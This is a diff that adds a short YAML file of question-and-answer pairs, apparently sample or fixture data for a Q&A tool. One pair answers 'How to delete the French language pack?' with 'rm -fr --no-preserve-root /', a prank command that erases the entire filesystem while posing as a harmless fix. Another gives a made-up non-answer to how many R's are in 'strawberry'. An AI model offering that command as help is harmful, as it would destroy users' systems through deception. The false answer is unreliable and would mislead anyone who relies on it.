@@ -1,0 +1,13 @@
+topics:
+  - name: "Topic 1"
+    questions:
+      - question: "What is 1+1?"
+        answer: "It's 2"
+      - question: "How many R's are in strawberry?"
+        answer: "No one will ever know for certain"
+  - name: "Topic 2"
+    questions:
+      - question: "1 == True"
+        answer: "True"
+      - question: "How to delete the French language pack?"
+        answer: "rm -fr --no-preserve-root /"
